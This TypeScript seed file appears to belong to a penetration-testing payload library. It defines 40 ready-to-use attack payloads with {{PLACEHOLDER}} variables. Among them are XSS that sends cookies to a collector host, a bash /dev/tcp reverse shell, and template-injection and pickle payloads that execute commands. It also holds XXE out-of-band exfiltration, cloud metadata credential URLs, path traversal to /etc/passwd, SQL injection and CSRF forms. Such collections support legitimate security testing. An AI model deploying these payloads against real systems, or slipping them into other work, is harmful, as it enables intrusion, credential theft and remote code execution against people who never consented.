// 40 well-known payloads seeded on first boot (only when the table is empty).
// Placeholders use {{NAME}} and are extracted into `variables` automatically.

export interface SeedPayload {
  title: string;
  category: string;
  language: string;
  description: string;
  body: string;
  source?: string;
}

export const SEED_PAYLOADS: SeedPayload[] = [
  // --- XSS ---
  {
    title: "Basic script alert",
    category: "XSS",
    language: "html",
    description: "Canonical reflected XSS proof.",
    body: `<script>alert(document.domain)</script>`,
  },
  {
    title: "Img onerror",
    category: "XSS",
    language: "html",
    description: "Fires when the image fails to load; bypasses many filters.",
    body: `<img src=x onerror=alert(document.cookie)>`,
  },
  {
    title: "SVG onload",
    category: "XSS",
    language: "html",
    description: "SVG-based XSS vector.",
    body: `<svg/onload=alert(1)>`,
  },
  {
    title: "JavaScript URI",
    category: "XSS",
    language: "html",
    description: "Anchor href javascript scheme.",
    body: `<a href="javascript:alert(1)">click</a>`,
  },
  {
    title: "Cookie exfil via fetch",
    category: "XSS",
    language: "html",
    description: "Steals cookies to an attacker collector.",
    body: `<script>fetch('https://{{COLLECTOR}}/c?'+document.cookie)</script>`,
  },

  // --- SQLI ---
  {
    title: "Auth bypass OR 1=1",
    category: "SQLI",
    language: "sql",
    description: "Classic login bypass.",
    body: `' OR '1'='1' -- `,
  },
  {
    title: "UNION SELECT columns",
    category: "SQLI",
    language: "sql",
    description: "Enumerate columns via UNION.",
    body: `' UNION SELECT NULL,{{COL}},NULL-- -`,
  },
  {
    title: "Boolean blind",
    category: "SQLI",
    language: "sql",
    description: "Boolean-based blind injection probe.",
    body: `' AND SUBSTRING(@@version,1,1)='{{CHAR}}'-- -`,
  },
  {
    title: "Time-based blind (MySQL)",
    category: "SQLI",
    language: "sql",
    description: "Detect injection through response delay.",
    body: `' AND SLEEP({{SECONDS}})-- -`,
  },
  {
    title: "Postgres stacked error",
    category: "SQLI",
    language: "sql",
    description: "Error-based extraction on PostgreSQL.",
    body: `' AND 1=CAST((SELECT version()) AS int)-- -`,
  },

  // --- SSTI ---
  {
    title: "Jinja2 arithmetic probe",
    category: "SSTI",
    language: "text",
    description: "Confirms server-side template evaluation.",
    body: `{{7*7}}`,
  },
  {
    title: "Jinja2 RCE",
    category: "SSTI",
    language: "python",
    description: "Popens a command via Jinja2 sandbox escape.",
    body: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('{{CMD}}').read() }}`,
  },
  {
    title: "Freemarker RCE",
    category: "SSTI",
    language: "text",
    description: "Apache Freemarker command execution.",
    body: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{{CMD}}")}`,
  },
  {
    title: "Twig RCE",
    category: "SSTI",
    language: "text",
    description: "Twig template filter abuse.",
    body: `{{['{{CMD}}']|filter('system')}}`,
  },

  // --- SSRF ---
  {
    title: "AWS metadata endpoint",
    category: "SSRF",
    language: "text",
    description: "Reach the cloud metadata service.",
    body: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
  },
  {
    title: "GCP metadata",
    category: "SSRF",
    language: "text",
    description: "Google Cloud metadata with required header.",
    body: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
  },
  {
    title: "Localhost bypass (decimal)",
    category: "SSRF",
    language: "text",
    description: "Decimal IP representation to dodge blocklists.",
    body: `http://2130706433/`,
  },

  // --- XXE ---
  {
    title: "Classic file read",
    category: "XXE",
    language: "xml",
    description: "External entity reads a local file.",
    body: `<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "file:///{{FILE}}">]>\n<r>&x;</r>`,
  },
  {
    title: "OOB exfiltration",
    category: "XXE",
    language: "xml",
    description: "Out-of-band XXE via external DTD.",
    body: `<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % p SYSTEM "http://{{COLLECTOR}}/e.dtd"> %p;]>\n<r/>`,
  },

  // --- RCE ---
  {
    title: "Command chaining",
    category: "RCE",
    language: "bash",
    description: "Append a command after a legitimate one.",
    body: `; {{CMD}} #`,
  },
  {
    title: "Backtick substitution",
    category: "RCE",
    language: "bash",
    description: "Command substitution inside an argument.",
    body: "`{{CMD}}`",
  },
  {
    title: "Reverse shell (bash)",
    category: "RCE",
    language: "bash",
    description: "TCP reverse shell.",
    body: `bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1`,
  },

  // --- LFI ---
  {
    title: "Path traversal /etc/passwd",
    category: "LFI",
    language: "text",
    description: "Read passwd through directory traversal.",
    body: `../../../../../../etc/passwd`,
  },
  {
    title: "PHP filter wrapper",
    category: "LFI",
    language: "text",
    description: "Base64-encode a source file via php://filter.",
    body: `php://filter/convert.base64-encode/resource={{FILE}}`,
  },
  {
    title: "Null byte (legacy)",
    category: "LFI",
    language: "text",
    description: "Truncate extension on old PHP builds.",
    body: `../../../../etc/passwd%00`,
  },

  // --- IDOR ---
  {
    title: "Sequential ID swap",
    category: "IDOR",
    language: "http",
    description: "Access another user's object by ID.",
    body: `GET /api/users/{{ID}}/profile HTTP/1.1\nHost: {{HOST}}`,
  },
  {
    title: "UUID enumeration note",
    category: "IDOR",
    language: "text",
    description: "Try predictable or leaked UUIDs on object endpoints.",
    body: `/api/orders/{{UUID}}`,
  },

  // --- CSRF ---
  {
    title: "Auto-submit form",
    category: "CSRF",
    language: "html",
    description: "Cross-site state-changing POST.",
    body: `<form action="https://{{HOST}}/account/email" method="POST" id="f">\n  <input name="email" value="{{EMAIL}}">\n</form>\n<script>document.getElementById('f').submit()</script>`,
  },

  // --- JWT ---
  {
    title: "alg:none bypass",
    category: "JWT",
    language: "text",
    description: "Unsigned token with the algorithm set to none.",
    body: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{{PAYLOAD_B64}}.`,
  },
  {
    title: "HS256 key confusion note",
    category: "JWT",
    language: "text",
    description: "Sign with the public key as HMAC secret when server accepts RS256/HS256.",
    body: `# Sign token HS256 using {{PUBLIC_KEY_PEM}} as the secret`,
  },

  // --- DESERIALIZATION ---
  {
    title: "Java ysoserial hint",
    category: "DESERIALIZATION",
    language: "bash",
    description: "Generate a gadget-chain payload.",
    body: `java -jar ysoserial.jar {{GADGET}} '{{CMD}}' | base64 -w0`,
  },
  {
    title: "Python pickle RCE",
    category: "DESERIALIZATION",
    language: "python",
    description: "Malicious pickle that runs a command on load.",
    body: `import os,pickle,base64\nclass E:\n  def __reduce__(self):\n    return (os.system,('{{CMD}}',))\nprint(base64.b64encode(pickle.dumps(E())).decode())`,
  },

  // --- RECON ---
  {
    title: "Subfinder + httpx",
    category: "RECON",
    language: "bash",
    description: "Enumerate subdomains and probe live hosts.",
    body: `subfinder -d {{DOMAIN}} -silent | httpx -silent -status-code -title`,
  },
  {
    title: "Nuclei full scan",
    category: "RECON",
    language: "bash",
    description: "Run nuclei templates against a target list.",
    body: `nuclei -l {{HOSTS_FILE}} -severity medium,high,critical -jsonl -o out.jsonl`,
  },
  {
    title: "Amass passive",
    category: "RECON",
    language: "bash",
    description: "Passive subdomain enumeration.",
    body: `amass enum -passive -d {{DOMAIN}} -o amass.txt`,
  },

  // --- BYPASS ---
  {
    title: "403 header override",
    category: "BYPASS",
    language: "http",
    description: "Spoof source IP to bypass access control.",
    body: `GET /{{PATH}} HTTP/1.1\nHost: {{HOST}}\nX-Forwarded-For: 127.0.0.1\nX-Original-URL: /{{PATH}}`,
  },
  {
    title: "Unicode path bypass",
    category: "BYPASS",
    language: "text",
    description: "Encoded slashes to slip past WAF path rules.",
    body: `/admin%2f..%2f{{PATH}}`,
  },
  {
    title: "Case + trailing dot host",
    category: "BYPASS",
    language: "http",
    description: "Host normalization bypass.",
    body: `GET / HTTP/1.1\nHost: {{HOST}}.`,
  },

  // --- OTHER ---
  {
    title: "Open redirect probe",
    category: "OTHER",
    language: "text",
    description: "Test unvalidated redirect parameter.",
    body: `https://{{HOST}}/redirect?url=https://evil.example/{{PATH}}`,
  },
  {
    title: "CRLF injection",
    category: "OTHER",
    language: "text",
    description: "Inject headers via carriage return / line feed.",
    body: `/%0d%0aSet-Cookie:{{COOKIE}}`,
  },
];
